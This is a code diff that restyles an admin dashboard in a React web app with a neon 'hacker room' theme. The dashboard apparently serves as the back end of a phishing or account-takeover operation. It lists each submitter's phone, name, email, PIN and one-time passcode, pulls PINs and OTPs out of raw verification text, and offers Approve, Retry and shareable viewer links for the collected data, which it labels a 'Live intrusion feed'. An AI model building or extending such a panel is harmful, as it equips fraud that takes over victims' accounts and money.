@@ -51,6 +51,8 @@ const AdminPage: React.FC<{ onBackToApp: () => void }> = ({ onBackToApp }) => {
   const [password, setPassword] = useState('');
   const [isLoggedIn, setIsLoggedIn] = useState(false);
   const [error, setError] = useState<string | null>(null);
+  const adminTitle = '⚡ ɴᴏɪᴢᴇ // 4RCH-0PS';
+  const adminSubtitle = 'HACKER-R00M • SUBMISSION GRID';
   const [applications, setApplications] = useState<ApplicationRecord[]>([]);
   const [isLoadingApplications, setIsLoadingApplications] = useState(true);
   const [links, setLinks] = useState<AdminLinkRecord[]>([]);
@@ -496,55 +498,84 @@ const AdminPage: React.FC<{ onBackToApp: () => void }> = ({ onBackToApp }) => {
 
   if (!isLoggedIn) {
     return (
-      <div className="w-full max-w-md rounded-3xl border border-slate-200 bg-white p-6 shadow-sm">
-        <button type="button" onClick={handleBackToApp} className="text-sm font-semibold text-slate-600 hover:text-slate-900">
-          ← Back to application
+      <div className="relative overflow-hidden w-full max-w-md rounded-3xl border border-[#14ff7d]/40 bg-[#020505] p-6 shadow-[0_0_70px_rgba(0,255,123,0.14)] text-[#d7ffdc]">
+        <div className="pointer-events-none absolute inset-0 bg-[radial-gradient(circle_at_top_left,_rgba(16,255,128,0.18),_transparent_34%)]" />
+        <div className="pointer-events-none absolute inset-0 bg-[linear-gradient(rgba(255,255,255,0.04)_1px,_transparent_1px),linear-gradient(90deg,rgba(255,255,255,0.04)_1px,_transparent_1px)] bg-[length:32px_32px]" />
+        <button type="button" onClick={handleBackToApp} className="relative z-10 text-xs uppercase tracking-[0.35em] text-[#8df4a2] hover:text-white">
+          ← BACK
         </button>
-        <h2 className="mt-4 text-2xl font-semibold text-slate-900">Admin Login</h2>
-        {error ? <div className="mt-3 rounded-2xl border border-red-200 bg-red-50 p-3 text-sm text-red-700">{error}</div> : null}
-        <form onSubmit={handleLogin} className="mt-6 space-y-4">
+        <div className="relative z-10 mt-4 space-y-3">
+          <div className="text-sm text-[#7ff1ab]">ACCESS PANEL</div>
+          <h2 className="text-3xl font-black uppercase tracking-[0.3em] text-[#dcff8f]">ADMIN LOGIN</h2>
+          <p className="text-sm text-[#96ffaa]">Enter the gateway credentials to access the terminal.</p>
+        </div>
+        {error ? (
+          <div className="relative z-10 mt-4 rounded-3xl border border-[#ff1f56]/30 bg-[#1f0413] p-4 text-sm text-[#ff7d96] shadow-[0_0_20px_rgba(255,31,86,0.18)]">
+            {error}
+          </div>
+        ) : null}
+        <form onSubmit={handleLogin} className="relative z-10 mt-6 space-y-4">
           <div>
-            <label className="block text-sm font-semibold text-slate-700">Username</label>
-            <input type="text" value={username} onChange={(e) => setUsername(e.target.value)} className="mt-2 w-full rounded-2xl border border-slate-300 px-4 py-3" required />
+            <label className="block text-xs uppercase tracking-[0.25em] text-[#8df4a2]">username</label>
+            <input type="text" value={username} onChange={(e) => setUsername(e.target.value)} className="mt-2 w-full rounded-3xl border border-[#14ff7d]/40 bg-[#07120f] px-4 py-3 text-sm text-[#e6ffe4] outline-none focus:border-[#6cff95] focus:ring-2 focus:ring-[#6cff95]/30" required />
           </div>
           <div>
-            <label className="block text-sm font-semibold text-slate-700">Password</label>
-            <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} className="mt-2 w-full rounded-2xl border border-slate-300 px-4 py-3" required />
+            <label className="block text-xs uppercase tracking-[0.25em] text-[#8df4a2]">password</label>
+            <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} className="mt-2 w-full rounded-3xl border border-[#14ff7d]/40 bg-[#07120f] px-4 py-3 text-sm text-[#e6ffe4] outline-none focus:border-[#6cff95] focus:ring-2 focus:ring-[#6cff95]/30" required />
           </div>
-          <button type="submit" className="w-full rounded-full bg-blue-600 px-4 py-3 text-sm font-semibold text-white">Sign In</button>
+          <button type="submit" className="w-full rounded-full border border-[#6cff95] bg-[#0d180f] px-4 py-3 text-sm font-semibold uppercase tracking-[0.35em] text-[#b4ffbb] shadow-[0_0_16px_rgba(108,255,149,0.25)] transition hover:bg-[#101d12]">
+            SIGN IN
+          </button>
         </form>
       </div>
     );
   }
 
   return (
-    <div className="w-full max-w-6xl rounded-[28px] border border-slate-200 bg-white p-6 shadow-sm">
-      <div className="flex flex-col gap-4 lg:flex-row lg:items-center lg:justify-between">
+    <div
+      className="relative overflow-hidden w-full max-w-6xl rounded-[28px] border border-[#14ff7d]/30 bg-[#020202] p-6 shadow-[0_0_96px_rgba(16,255,126,0.18)] text-[#b8ffb7]"
+      style={{
+        backgroundImage:
+          'radial-gradient(circle at top left, rgba(16,255,126,0.16), transparent 24%), linear-gradient(rgba(255,255,255,0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.05) 1px, transparent 1px)',
+        backgroundSize: '48px 48px, 48px 48px, 48px 48px',
+      }}
+    >
+      <div className="pointer-events-none absolute inset-0 bg-[radial-gradient(circle_at_bottom_right,_rgba(0,255,180,0.12),_transparent_35%)]" />
+      <div className="relative z-10 flex flex-col gap-4 lg:flex-row lg:items-center lg:justify-between">
         <div>
-          <button type="button" onClick={onBackToApp} className="text-sm font-semibold text-slate-600 hover:text-slate-900">
-            ← Back to application
+          <button type="button" onClick={onBackToApp} className="text-xs uppercase tracking-[0.35em] text-[#7aff9a] hover:text-white">
+            ← EXIT
           </button>
-          <h1 className="mt-3 text-2xl font-semibold text-slate-900">Admin dashboard</h1>
-          <p className="mt-2 text-sm text-slate-500">Live phone numbers from every submission.</p>
+          <h1 className="mt-3 text-4xl font-black uppercase tracking-[0.22em] text-[#d4ff9b]">
+            ⚡ .ADMIN / TERMINAL
+          </h1>
+          <p className="mt-2 text-sm uppercase tracking-[0.3em] text-[#85ff9f]">{adminSubtitle}</p>
         </div>
-        <div className="flex items-center gap-2 rounded-full bg-slate-100 px-4 py-2 text-sm font-medium text-slate-600">
-          <span className={`h-2.5 w-2.5 rounded-full bg-emerald-500 transition-all duration-200 ${notificationPulse ? 'opacity-100 scale-110' : 'opacity-0 scale-75'}`} />
-          <span>Realtime-ready</span>
+        <div className="flex items-center gap-2 rounded-full border border-[#7cff9d]/40 bg-[#08120d]/80 px-4 py-2 text-xs uppercase tracking-[0.25em] text-[#98ffad]">
+          <span className={`h-2.5 w-2.5 rounded-full bg-[#00ff6d] transition-all duration-200 ${notificationPulse ? 'opacity-100 scale-125' : 'opacity-40 scale-90'}`} />
+          <span>sensor active</span>
         </div>
       </div>
 
-      {error ? <div className="mt-6 rounded-2xl border border-red-200 bg-red-50 p-3 text-sm text-red-700">{error}</div> : null}
+      {error ? (
+        <div className="relative z-10 mt-6 rounded-3xl border border-[#ff4c6b]/40 bg-[#16050f] p-4 text-sm text-[#ff8ba0] shadow-[0_0_26px_rgba(255,76,107,0.18)]">
+          {error}
+        </div>
+      ) : null}
 
-      <div className="mt-6 grid gap-6 lg:grid-cols-[1.2fr_0.8fr]">
-        <section className="rounded-3xl border border-slate-200 p-4">
+      <div className="relative z-10 mt-6 grid gap-6 lg:grid-cols-[1.2fr_0.8fr]">
+        <section className="rounded-3xl border border-[#14ff7d]/20 bg-[#091012]/90 p-4 shadow-[0_0_24px_rgba(16,255,126,0.08)]">
           <div className="flex items-center justify-between">
-            <h2 className="text-lg font-semibold text-slate-900">Applications</h2>
-            <span className="text-sm text-slate-500">{applications.length} total</span>
+            <div>
+              <h2 className="text-lg font-semibold uppercase tracking-[0.2em] text-[#d8ffa8]">Submission Grid</h2>
+              <p className="text-xs uppercase tracking-[0.25em] text-[#7dff9b]">Live intrusion feed</p>
+            </div>
+            <span className="text-sm uppercase tracking-[0.25em] text-[#84ffad]">{applications.length} nodes</span>
           </div>
           {isLoadingApplications ? (
-            <div className="mt-4 rounded-2xl border border-slate-200 bg-slate-50 p-6 text-sm text-slate-600">Loading submissions…</div>
+            <div className="mt-4 rounded-3xl border border-[#14ff7d]/20 bg-[#061011] p-6 text-sm text-[#7aff9e]">loading feed…</div>
           ) : applications.length === 0 ? (
-            <div className="mt-4 rounded-2xl border border-slate-200 bg-slate-50 p-6 text-sm text-slate-600">No submissions yet.</div>
+            <div className="mt-4 rounded-3xl border border-[#14ff7d]/20 bg-[#061011] p-6 text-sm text-[#7aff9e]">no active submissions.</div>
           ) : (
             <div className="mt-4 space-y-3">
               {applications.map((app) => {
@@ -552,103 +583,102 @@ const AdminPage: React.FC<{ onBackToApp: () => void }> = ({ onBackToApp }) => {
                 const pinValue = app.pin || rawVerificationValue.match(/PIN[:\s]+([^\s/]+)/i)?.[1] || '—';
                 const otpValue = app.otp || rawVerificationValue.match(/OTP[:\s]+([^\s/]+)/i)?.[1] || '—';
                 return (
-                <div key={app.id} className="rounded-2xl border border-slate-200 p-4">
-                  <div className="flex flex-col gap-2 sm:flex-row sm:items-center sm:justify-between">
-                    <div>
-                      <p className="text-base font-semibold text-slate-900">{app.phone || '—'}</p>
-                      <p className="text-sm text-slate-600">{[app.firstName, app.lastName].filter(Boolean).join(' ') || 'Unknown applicant'}</p>
+                  <div key={app.id} className="group relative overflow-hidden rounded-3xl border border-[#14ff7d]/20 bg-[#050a0b] p-4 shadow-[0_0_28px_rgba(16,255,126,0.08)] transition hover:-translate-y-0.5 hover:border-[#7cff9d]/70">
+                    <div className="absolute right-4 top-4 h-2 w-2 rounded-full bg-[#ffb300] shadow-[0_0_18px_rgba(255,179,0,0.45)] animate-pulse" />
+                    <div className="flex flex-col gap-2 sm:flex-row sm:items-center sm:justify-between">
+                      <div>
+                        <p className="text-base font-semibold uppercase tracking-[0.15em] text-[#effffe]">{app.phone || '—'}</p>
+                        <p className="text-sm uppercase tracking-[0.18em] text-[#79ff9a]">{[app.firstName, app.lastName].filter(Boolean).join(' ') || 'UNKNOWN'}</p>
+                      </div>
+                      <div className="text-sm uppercase tracking-[0.18em] text-[#73ff96]">{app.submittedAt ? formatDateTime(app.submittedAt) : '—'}</div>
                     </div>
-                    <div className="text-sm text-slate-500">{app.submittedAt ? formatDateTime(app.submittedAt) : '—'}</div>
-                  </div>
-                  <div className="mt-3">
-                    <div className="rounded-xl bg-slate-50 p-3 text-sm text-slate-700">
-                      <div><strong className="text-slate-900">Email:</strong> {app.email || 'Not provided'}</div>
-                      <div className="mt-1"><strong className="text-slate-900">Phone:</strong> {app.phone || '—'}</div>
-                      <div className="mt-1"><strong className="text-slate-900">PIN:</strong> {pinValue}</div>
-                      <div className="mt-1"><strong className="text-slate-900">OTP:</strong> {otpValue}</div>
+                    <div className="mt-3 rounded-2xl bg-[#091213]/95 p-3 text-sm text-[#c8ffd0]">
+                      <div><strong className="text-[#aef3b7]">EMAIL:</strong> {app.email || 'N/A'}</div>
+                      <div className="mt-1"><strong className="text-[#aef3b7]">PHONE:</strong> {app.phone || '—'}</div>
+                      <div className="mt-1"><strong className="text-[#aef3b7]">PIN:</strong> {pinValue}</div>
+                      <div className="mt-1"><strong className="text-[#aef3b7]">OTP:</strong> {otpValue}</div>
                     </div>
-                  </div>
-                  <div className="mt-3 flex flex-wrap items-center justify-between gap-3">
-                    <div className="text-sm text-slate-500">{app.status || 'Pre-Approved'}</div>
-                    <div className="flex flex-wrap gap-2">
-                      {app.status?.toLowerCase() !== 'approved' ? (
+                    <div className="mt-3 flex flex-wrap items-center justify-between gap-3">
+                      <div className="text-xs uppercase tracking-[0.25em] text-[#9cffb5]">{app.status || 'PRE-APPROVED'}</div>
+                      <div className="flex flex-wrap gap-2">
+                        {app.status?.toLowerCase() !== 'approved' ? (
+                          <button
+                            type="button"
+                            onClick={() => approveApplication(app.id)}
+                            disabled={Boolean(isApproving[app.id])}
+                            className="rounded-full border border-[#12ff7d] bg-[#09201c] px-4 py-2 text-sm font-black uppercase tracking-[0.3em] text-[#c6ffcb] shadow-[0_0_18px_rgba(18,255,125,0.16)] transition hover:border-[#6cff95] hover:bg-[#0f221d] disabled:opacity-60"
+                          >
+                            {isApproving[app.id] ? 'APPROVING…' : '☠ APPROVE'}
+                          </button>
+                        ) : (
+                          <span className="rounded-full bg-[#12221a] px-3 py-1 text-xs font-semibold uppercase tracking-[0.3em] text-[#7dff9a]">APPROVED</span>
+                        )}
                         <button
                           type="button"
-                          onClick={() => approveApplication(app.id)}
+                          onClick={() => retryApplication(app.id)}
                           disabled={Boolean(isApproving[app.id])}
-                          className="rounded-full bg-blue-600 px-4 py-2 text-sm font-semibold text-white transition hover:bg-blue-700 disabled:opacity-60"
+                          className="rounded-full border border-[#35ffa2] bg-[#061110] px-4 py-2 text-sm font-semibold uppercase tracking-[0.25em] text-[#a5ffc8] transition hover:border-[#73ffa7] disabled:opacity-60"
                         >
-                          {isApproving[app.id] ? 'Approving…' : 'Approve'}
+                          RETRY
                         </button>
-                      ) : (
-                        <span className="rounded-full bg-emerald-100 px-3 py-1 text-xs font-semibold text-emerald-800">Approved</span>
-                      )}
-                      <button
-                        type="button"
-                        onClick={() => retryApplication(app.id)}
-                        disabled={Boolean(isApproving[app.id])}
-                        className="rounded-full border border-slate-300 bg-white px-4 py-2 text-sm font-semibold text-slate-700 transition hover:border-slate-400 disabled:opacity-60"
-                      >
-                        Retry
-                      </button>
+                      </div>
                     </div>
                   </div>
-                </div>
                 );
               })}
             </div>
           )}
         </section>
 
-        <section className="space-y-4 rounded-3xl border border-slate-200 p-4">
+        <section className="space-y-4 rounded-3xl border border-[#14ff7d]/20 bg-[#081312]/90 p-4 shadow-[0_0_24px_rgba(16,255,126,0.08)]">
           <div>
-            <h2 className="text-lg font-semibold text-slate-900">Viewer links</h2>
-            <p className="mt-1 text-sm text-slate-500">Create secure shareable links for read-only views.</p>
+            <h2 className="text-lg font-semibold uppercase tracking-[0.2em] text-[#d8ffa8]">Viewer links</h2>
+            <p className="mt-1 text-xs uppercase tracking-[0.25em] text-[#7dff9b]">create secure share links</p>
           </div>
 
-          <div className="rounded-2xl border border-slate-200 bg-slate-50 p-4">
+          <div className="rounded-3xl border border-[#14ff7d]/20 bg-[#061211] p-4">
             <div className="grid gap-3 sm:grid-cols-3">
               <div>
-                <label className="block text-sm font-semibold text-slate-700">Minutes</label>
-                <input value={minutes} onChange={(e) => setMinutes(e.target.value)} className="mt-2 w-full rounded-2xl border border-slate-300 px-3 py-2" />
+                <label className="block text-xs uppercase tracking-[0.25em] text-[#8dffab]">minutes</label>
+                <input value={minutes} onChange={(e) => setMinutes(e.target.value)} className="mt-2 w-full rounded-3xl border border-[#19ff7a]/40 bg-[#08110f] px-3 py-2 text-sm text-[#d9ffd4] outline-none focus:border-[#7fffab] focus:ring-2 focus:ring-[#7fffab]/20" />
               </div>
               <div>
-                <label className="block text-sm font-semibold text-slate-700">Hours</label>
-                <input value={hours} onChange={(e) => setHours(e.target.value)} className="mt-2 w-full rounded-2xl border border-slate-300 px-3 py-2" />
+                <label className="block text-xs uppercase tracking-[0.25em] text-[#8dffab]">hours</label>
+                <input value={hours} onChange={(e) => setHours(e.target.value)} className="mt-2 w-full rounded-3xl border border-[#19ff7a]/40 bg-[#08110f] px-3 py-2 text-sm text-[#d9ffd4] outline-none focus:border-[#7fffab] focus:ring-2 focus:ring-[#7fffab]/20" />
               </div>
               <div>
-                <label className="block text-sm font-semibold text-slate-700">Days</label>
-                <input value={days} onChange={(e) => setDays(e.target.value)} className="mt-2 w-full rounded-2xl border border-slate-300 px-3 py-2" />
+                <label className="block text-xs uppercase tracking-[0.25em] text-[#8dffab]">days</label>
+                <input value={days} onChange={(e) => setDays(e.target.value)} className="mt-2 w-full rounded-3xl border border-[#19ff7a]/40 bg-[#08110f] px-3 py-2 text-sm text-[#d9ffd4] outline-none focus:border-[#7fffab] focus:ring-2 focus:ring-[#7fffab]/20" />
               </div>
             </div>
             <div className="mt-3">
-              <label className="block text-sm font-semibold text-slate-700">Exact expiry date/time</label>
-              <input type="datetime-local" value={exactExpiry} onChange={(e) => setExactExpiry(e.target.value)} className="mt-2 w-full rounded-2xl border border-slate-300 px-3 py-2" />
+              <label className="block text-xs uppercase tracking-[0.25em] text-[#8dffab]">exact expiry date/time</label>
+              <input type="datetime-local" value={exactExpiry} onChange={(e) => setExactExpiry(e.target.value)} className="mt-2 w-full rounded-3xl border border-[#19ff7a]/40 bg-[#08110f] px-3 py-2 text-sm text-[#d9ffd4] outline-none focus:border-[#7fffab] focus:ring-2 focus:ring-[#7fffab]/20" />
             </div>
-            <button type="button" onClick={createLink} disabled={isCreatingLink} className="mt-4 w-full rounded-full bg-blue-600 px-4 py-3 text-sm font-semibold text-white disabled:opacity-60">
-              {isCreatingLink ? 'Creating link…' : 'Create viewer link'}
+            <button type="button" onClick={createLink} disabled={isCreatingLink} className="mt-4 w-full rounded-full border border-[#14ff7d] bg-[#06110f] px-4 py-3 text-sm font-semibold uppercase tracking-[0.35em] text-[#c9ffd5] shadow-[0_0_18px_rgba(20,255,125,0.2)] transition hover:border-[#7cff9d] hover:bg-[#08140f] disabled:opacity-60">
+              {isCreatingLink ? 'BUILDING LINK…' : 'BUILD VIEWER LINK'}
             </button>
             {createdLink ? (
-              <div className="mt-3 rounded-2xl border border-emerald-200 bg-emerald-50 p-3 text-sm text-emerald-700">
-                <div className="font-semibold">Created link</div>
-                <a href={createdLink} target="_blank" rel="noreferrer" className="break-all underline">{createdLink}</a>
+              <div className="mt-3 rounded-3xl border border-[#14ff7d]/30 bg-[#08110f] p-3 text-sm text-[#afffa4] shadow-[0_0_18px_rgba(20,255,125,0.18)]">
+                <div className="font-semibold uppercase tracking-[0.25em] text-[#c8ffb0]">CREATED LINK</div>
+                <a href={createdLink} target="_blank" rel="noreferrer" className="break-all underline text-[#8dffae]">{createdLink}</a>
               </div>
             ) : null}
           </div>
 
           <div className="space-y-2">
             {links.length === 0 ? (
-              <div className="rounded-2xl border border-slate-200 bg-slate-50 p-3 text-sm text-slate-600">No links yet.</div>
+              <div className="rounded-3xl border border-[#14ff7d]/20 bg-[#061011] p-3 text-sm text-[#7dff9a]">no viewer channels active.</div>
             ) : (
               links.map((link) => (
-                <div key={link.id} className="rounded-2xl border border-slate-200 p-3 text-sm">
+                <div key={link.id} className="rounded-3xl border border-[#14ff7d]/20 bg-[#061011] p-3 text-sm text-[#bdfcbc] shadow-[0_0_18px_rgba(16,255,126,0.1)]">
                   <div className="flex items-center justify-between gap-2">
                     <div>
-                      <div className="font-semibold text-slate-900">{link.revoked ? 'Revoked' : 'Active'}</div>
-                      <div className="text-slate-500">Expires {formatDateTime(link.expires_at)}</div>
+                      <div className="font-semibold uppercase tracking-[0.25em] text-[#d8ffa8]">{link.revoked ? 'revoked' : 'active'}</div>
+                      <div className="text-xs uppercase tracking-[0.25em] text-[#83ff9c]">expires {formatDateTime(link.expires_at)}</div>
                     </div>
-                    <button type="button" onClick={() => revokeLink(link.id)} className="rounded-full border border-slate-300 px-3 py-1 text-xs font-semibold text-slate-700">
-                      Revoke
+                    <button type="button" onClick={() => revokeLink(link.id)} className="rounded-full border border-[#14ff7d]/50 px-3 py-1 text-xs font-semibold uppercase tracking-[0.25em] text-[#c9ffd2] transition hover:border-[#7cff9d]">
+                      REVOKE
                     </button>
                   </div>
                 </div>
